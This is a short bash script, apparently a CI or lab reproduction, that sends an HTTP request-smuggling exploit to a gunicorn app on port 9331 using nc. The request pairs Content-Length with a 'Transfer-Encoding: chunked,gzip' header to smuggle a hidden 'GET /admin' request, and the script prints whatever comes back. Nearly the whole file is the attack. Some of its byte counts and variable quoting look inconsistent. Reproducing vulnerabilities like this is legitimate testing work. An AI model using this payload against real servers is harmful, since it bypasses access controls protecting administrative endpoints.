#!/bin/bash

IS_CI_RUN=$1
HOSTNAME='http://localhost'

if [ "$IS_CI_RUN" = true ]; then
    HOSTNAME='gunicorn-app'
fi

# Exploit command
response=$(printf 'POST / HTTP/1.1\r\nHost: $HOSTNAME\r\nContent-Length: 6\r\nTransfer-Encoding: chunked,gzip\r\n\r\n73\r\n\r\nGET /admin HTTP/1.1\r\nHost: $HOSTNAME\r\n\r\n0' | nc $HOSTNAME 9331)

# Print the response
echo "Exploit response:"
echo "$response"
